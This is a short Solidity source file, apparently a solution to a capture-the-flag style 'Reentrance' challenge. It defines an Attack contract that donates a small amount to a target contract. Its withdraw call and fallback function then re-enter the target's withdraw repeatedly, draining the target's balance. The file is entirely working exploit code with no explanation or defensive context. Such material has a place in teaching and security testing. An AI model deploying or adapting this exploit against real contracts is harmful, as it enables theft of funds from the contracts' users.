// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Reentrance.sol";

contract Attack {
    Reentrance target;

    constructor(address payable _target) {
        target = Reentrance(_target);
    }

    function attack() public payable {
        require(msg.value >= 0.001 ether);
        target.donate{value: 0.001 ether}(address(this));
        target.withdraw(0.001 ether);
    }

    fallback() external payable {
        if(address(target).balance >= 0.001 ether) {
            target.withdraw(0.001 ether);
        }
    }

}